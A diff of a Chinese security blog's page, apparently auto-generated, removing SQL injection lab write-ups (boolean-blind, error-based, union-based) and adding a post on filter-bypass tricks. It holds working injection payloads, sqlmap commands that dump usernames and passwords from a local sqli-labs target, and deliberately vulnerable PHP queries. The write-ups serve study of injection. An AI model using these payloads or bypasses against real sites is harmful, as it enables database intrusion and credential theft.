-          <a href="/2022/11/10/SQL%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">SQL注入-布尔盲注</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-10 10:18:02" itemprop="dateCreated datePublished" datetime="2022-11-10T10:18:02+08:00">2022-11-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 23:26:32" itemprop="dateModified" datetime="2023-03-07T23:26:32+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-布尔盲注"><a href="#SQL注入-布尔盲注" class="headerlink" title="SQL注入-布尔盲注"></a>SQL注入-布尔盲注</h1><hr>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>在有些情况下，后台使用了错误信息屏蔽方法（比如@），屏蔽了报错，</p>
-<p>无法在根据报错信息来进行注入的判断，该情况称为”盲注”</p>
-<h2 id="表现形式"><a href="#表现形式" class="headerlink" title="表现形式"></a>表现形式</h2><p>based boolean （布尔盲注）</p>
-<p>based time（时间盲注）</p>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>传入“”错误“”参数和“正确”参数，观察页面是否发生了变化</p>
-<h2 id="所用函数"><a href="#所用函数" class="headerlink" title="所用函数"></a>所用函数</h2><ul>
-<li><p>length() 获取字符串的长度</p>
-</li>
-<li><p>substr() 截取字符串</p>
-<p>语法：substr(string,num start,num length)</p>
-<p>string 字符串；start 起始位置(从1开始)；截取长度</p>
-</li>
-<li><p>ascii() 把字符转换为ascii码值</p>
-</li>
-</ul>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，只显示了you are in..<br><img src="https://img-blog.csdnimg.cn/20210409191805971.png" alt="在这里插入图片描述"><br>.2、将1改为0，观察页面是否发生了变化<br>you are in… 这三个单词不见了<br>页面发生变化<br><img src="https://img-blog.csdnimg.cn/20210409191915954.png" alt="在这里插入图片描述"></p>
-<p>3、貌似是布尔盲注,通过探测得知为字符型布尔盲注<br><img src="https://img-blog.csdnimg.cn/20210409192627624.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409192638644.png" alt="在这里插入图片描述"></p>
-<p>4、使用substr() 探测数据库版本号<br>本地操作：<br><img src="https://img-blog.csdnimg.cn/20210409193324370.png" alt="在这里插入图片描述"></p>
-<p>靶场：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">8</span>/?id=<span class="number">1</span>&#x27; and substr(version(),<span class="number">1</span>,<span class="number">1</span>)  = <span class="number">5</span>-- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409193215482.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021040919322856.png" alt="在这里插入图片描述"><br>5、版本号5.0以上，使用length() 探测数据库名的长度</p>
-<p><img src="https://img-blog.csdnimg.cn/2021040919354449.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409193555975.png" alt="在这里插入图片描述"><br>6、得知数据库名长度为8，可进行猜单词，会不会是security，8个字母<br>使用 substr()、ascii()验证猜想<br><img src="https://img-blog.csdnimg.cn/20210409193957463.png" alt="在这里插入图片描述"><br>得知s字母的在ASCII码表中的数字是115<br>故可以构造poc</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409194232892.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210409194244393.png" alt="在这里插入图片描述"><br>可以验证当前数据库名的第一个单词是s，猜想正确</p>
-<p>验证第二个<br><img src="https://img-blog.csdnimg.cn/20210409194332763.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202104091943526.png" alt="在这里插入图片描述"><br>第二个单词为e，猜想正确<br>接下来进行一一猜解<br>7、知道了数据库名后，又知道版本号为5.0以上版本，故可利用information_schema数据库进行爆出相关数据<br>利用方法与上一步同理<br>8、由于一个单词一个单词猜解，过于费时费力，所以可以使用自动化工具SQLMap</p>
-<h2 id="SQLMap跑布尔盲注"><a href="#SQLMap跑布尔盲注" class="headerlink" title="SQLMap跑布尔盲注"></a>SQLMap跑布尔盲注</h2><p><strong>基本操作</strong></p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 可以使用 --technique 指定SQLMap探测技术</span><br><span class="line">支持的探测方式有：</span><br><span class="line"> - <span class="keyword">B: </span>基于<span class="keyword">Boolean的盲注（Boolean </span><span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - Q: 内联查询（inlin queries） </span><br><span class="line"> - T:基于时间的盲注（time <span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - U: 联合查询（union query <span class="keyword">based） </span></span><br><span class="line"> - E: 错误（errorbased） </span><br></pre></td></tr></table></figure>
-
-<p>1、由于已经知道存在 布尔盲注</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/sqli/Less-8/?id=1&quot; <span class="comment">--technique B --current-db</span></span><br></pre></td></tr></table></figure>
-
-<p>得出当前数据库名security<br><img src="https://img-blog.csdnimg.cn/20210409201132317.png" alt="在这里插入图片描述"></p>
-<p>2、跑security数据库下的表面</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://127.0.0.1/sqli/Less-8/?id=1&quot;</span> <span class="attr">--technique</span> B -D security </span><br><span class="line"><span class="attr">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409201932839.png" alt="在这里插入图片描述"></p>
-<p>3、跑出 users表下的字段名</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://127.0.0.1/sqli/Less-8/?id=1&quot;</span> <span class="attr">--technique</span> B -D security -T users <span class="attr">--columns</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409212137686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>4、跑出id、username、password的数据</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-8/?id=1&quot;</span> <span class="comment">--technique B -D security -T users </span></span><br><span class="line">-C <span class="built_in">id</span>,username,password <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210409212101436.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/09/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/09/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-报错注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-09 17:17:08" itemprop="dateCreated datePublished" datetime="2022-11-09T17:17:08+08:00">2022-11-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 23:26:14" itemprop="dateModified" datetime="2023-03-07T23:26:14+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-报错注入"><a href="#SQL注入-报错注入" class="headerlink" title="SQL注入-报错注入"></a>SQL注入-报错注入</h1><hr>
-<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>当页面没有正确的返回错误信息时，就可以利用报错注入</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用数据库中的个别函数进行报错使用</p>
-<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><p>updatexml()</p>
-<p>extractvalue()</p>
+          <h1 id="SQL注入-Bypass"><a href="#SQL注入-Bypass" class="headerlink" title="SQL注入-Bypass"></a>SQL注入-Bypass</h1><hr>
+<h1 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过 过滤"></a>绕过 过滤</h1><h2 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h2><p>MYSQL中的注释符</p>
+<p>单行注释：–空格 或 #</p>
+<p>多行注释：&#x2F;* 多行注释的内容*&#x2F;</p>
+<p>可以利用 or ‘1’ &#x3D; ‘1 闭合单引号</p>
+<h2 id="剔除了or和and的绕过"><a href="#剔除了or和and的绕过" class="headerlink" title="剔除了or和and的绕过"></a>剔除了or和and的绕过</h2><p>MySQL去大小写不敏感</p>
+<p>MySQL支持十六进制</p>
+<p>and –&gt; &amp;&amp; or–&gt; ||</p>
+<p>内联注释 （内联中的语句会当作sql语句执行） &#x2F;<em>! 内联注释</em>&#x2F;</p>
 <blockquote>
-<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2></blockquote>
-<p>extractvalue() :对XML文档进行查询的函数</p>
-<p>语法：extractvalue(目标xml文档，xml路径)</p>
-<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
-<p>extractvalue(456,concat(0x7e,version(),0x7e))</p>
-<blockquote>
-<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2></blockquote>
-<p>updatexml()：更新XML文档的函数</p>
-<p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p>
-<p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</p>
-<p>实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码</p>
-<h2 id="其他所用函数"><a href="#其他所用函数" class="headerlink" title="其他所用函数"></a>其他所用函数</h2><p>concat() &#x3D;&#x3D;&gt;将多个字符串连接成一个字符串</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210408150559699.png" alt="在这里插入图片描述"><br>2、使用反斜杠\进行探测，报出错误信息<br><img src="https://img-blog.csdnimg.cn/20210408150633356.png" alt="在这里插入图片描述"></p>
-<p>3、分析报错</p>
-<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">\&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; ==&gt;&#x27;</span><span class="number">1</span><span class="string">\&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>  ==&gt;猜测变量由单引号包裹</span><br><span class="line">故构造payload  <span class="number">1</span><span class="string">&#x27; -- q</span></span><br></pre></td></tr></table></figure>
-
-<p>4、写入payload，页面正常<br><img src="https://img-blog.csdnimg.cn/20210408150839219.png" alt="在这里插入图片描述"></p>
-<p>5、得到字段数3，观察到页面没有回显点，但是有报错信息<br><img src="https://img-blog.csdnimg.cn/20210408150956944.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408151013948.png" alt="在这里插入图片描述"></p>
-<p>6、可利用updatexml()函数</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造payload：<span class="built_in">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">version</span>(),<span class="number">0</span>x7e),<span class="number">1</span>)</span><br><span class="line">注意MySQL支持<span class="number">16</span>进制编码</span><br><span class="line">http:<span class="comment">//127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,version(),0x7e),1)-- q</span></span><br><span class="line">得出版本号 <span class="number">5.0</span>以上</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210408151212291.png" alt="在这里插入图片描述"></p>
-<p>7、利用MySQL自带数据库information_schema</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and</span><br><span class="line"> updatexml(1,concat(0x7e,(select table_name from information_schema.tables where </span><br><span class="line"> table_schema=database() limit 0,1),0x7e),1) -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210408152319301.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152332281.png" alt="在这里插入图片描述"><br>8、查看users表中的字段名</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; and updatexml(<span class="number">1</span>,</span><br><span class="line"><span class="attribute">concat</span>(<span class="number">0</span>x7e,(select column_name from information_schema.columns where</span><br><span class="line"> <span class="attribute">table_schema</span>=database() and table_name=&#x27;users&#x27; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>) -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210408152601678.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152622819.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152635212.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152645195.png" alt="在这里插入图片描述"><br>得出users表中有三个字段名：id、username、password</p>
-<p>9、分别得出username和password 字段数据<br>第一个username字段数据Dumb<br><img src="https://img-blog.csdnimg.cn/20210408154022268.png" alt="在这里插入图片描述"><br>第一个password字段数据：Dumb<br><img src="https://img-blog.csdnimg.cn/20210408154059558.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E5%AD%97%E7%AC%A6%E5%9E%8B/" class="post-title-link" itemprop="url">SQL注入-联合注入【字符型】</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-08 16:15:40" itemprop="dateCreated datePublished" datetime="2022-11-08T16:15:40+08:00">2022-11-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 23:28:34" itemprop="dateModified" datetime="2023-03-07T23:28:34+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-联合注入【字符型】"><a href="#SQL注入-联合注入【字符型】" class="headerlink" title="SQL注入-联合注入【字符型】"></a>SQL注入-联合注入【字符型】</h1><hr>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
-<p><strong>注入的本质</strong></p>
+<p>策略</p>
 </blockquote>
-<p>用户输入的数据被当做代码执行</p>
-<blockquote>
-<p><strong>注入条件</strong></p>
-</blockquote>
-<p>用户可以控制传参</p>
-<p>用户输入的语句被带入数据库并执行</p>
-<blockquote>
-<p><strong>显错注入原理</strong></p>
-</blockquote>
-<p>用户输入的数据被当做SQL语句执行，并带入数据库执行</p>
-<p>对用户输入的数据没有做任何过滤，并且将结果返回到页面</p>
-<p>没有做任何防护</p>
-<blockquote>
-<p><strong>注入的关键操作</strong></p>
-</blockquote>
-<p>构造闭合</p>
-<blockquote>
-<h2 id="注入基础"><a href="#注入基础" class="headerlink" title="注入基础"></a>注入基础</h2></blockquote>
-<p>MySQL注释符：# 或 –空格 或 &#x2F;***&#x2F;<br>内联注释：&#x2F;**! SQL语句 *&#x2F; 只有MySQL可以识别，常用来绕过WAF<br>注入探测符：常使用 \ 进行探测</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、靶场<br><img src="https://img-blog.csdnimg.cn/20210408142344574.png" alt="在这里插入图片描述"><br>2、根据前面的数学型注入，可先使用and 1&#x3D;2 探测<br><img src="https://img-blog.csdnimg.cn/20210408142446753.png" alt="在这里插入图片描述"><br>页面无反应</p>
-<p>3、使用探测符号\</p>
-<p><img src="https://img-blog.csdnimg.cn/20210408142543703.png" alt="在这里插入图片描述"></p>
-<p>4、根据报错信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>1\<span class="string">&#x27; LIMIT 0,1&#x27;</span> ==&gt; <span class="string">&#x27;1\&#x27;</span> LIMIT 0,1 （反斜杠通常为转义符）==&gt;可猜测变量<span class="built_in">id</span>由单引号字符围绕</span><br><span class="line">构造payload： <span class="built_in">id</span>=1<span class="string">&#x27; -- q （--空格 为MySQL的注释符）</span></span><br></pre></td></tr></table></figure>
+<p>大小写变形</p>
+<p>使用注释的方式 an&#x2F;**&#x2F;d</p>
+<p>双写绕过 anandd</p>
+<p>符号替换 and –&gt; &amp;&amp; or–&gt; ||</p>
+<h2 id="去除空格的绕过"><a href="#去除空格的绕过" class="headerlink" title="去除空格的绕过"></a>去除空格的绕过</h2><p>使用URL编码 空格的URL编码为%20 %09（tab键）</p>
+<p>使用SQLmap</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> <span class="params">--hex</span> <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>
 
-<p>5、查看后端源代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>添加构造的payload后：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;-- q&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>6、将payload写入到靶场中，页面正常<br><img src="https://img-blog.csdnimg.cn/2021040814314597.png" alt="靶场"></p>
-<p>7、使用oder by 探测字段数<br><img src="https://img-blog.csdnimg.cn/20210408143335527.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021040814335354.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408143407330.png" alt="在这里插入图片描述"><br>8、探测字段数为3，使用联合查询，观察回显点<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-1/?id=0">http://127.0.0.1/sqli/Less-1/?id=0</a>‘ union select 1,2,3 – q<br><img src="https://img-blog.csdnimg.cn/20210408143911574.png" alt="在这里插入图片描述"><br>9、探测版本号和当前数据库名<br><img src="https://img-blog.csdnimg.cn/202104081440130.png" alt="在这里插入图片描述"><br>10、利用MySQL自带数据库information_schema得出数据</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">0</span>&#x27; union select <span class="number">1</span>,version(),group_concat(table_name) </span><br><span class="line"><span class="attribute">from</span> information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210408144225801.png" alt="在这里插入图片描述"><br>11、查看users数据表中的字段名</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,version(),group_concat(column_name)</span><br><span class="line"> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span> -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210408144440142.png" alt="在这里插入图片描述"><br>12、查询username、password字段信息，使用limit 依次查看</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">0</span>&#x27; union select <span class="number">1</span>,username,password from users limit <span class="number">3</span>,<span class="number">1</span> -- q</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210408144636820.png" alt="在这里插入图片描述"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>字符型注入与数字型注入的区别为 有无包裹变量的符号不同<br>以下几种包裹方式注入，与‘$id’ 注入同理</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=“<span class="subst">$id</span>” LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(“<span class="subst">$id</span>”) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>注入的关键在于 <strong>构造闭合</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E6%95%B0%E5%AD%97%E5%9E%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/08/SQL%E6%B3%A8%E5%85%A5%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E6%95%B0%E5%AD%97%E5%9E%8B/" class="post-title-link" itemprop="url">SQL注入-联合注入【数字型】</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-08 13:50:04" itemprop="dateCreated datePublished" datetime="2022-11-08T13:50:04+08:00">2022-11-08</time>
-    </span>
-    <span class="post-meta-item">
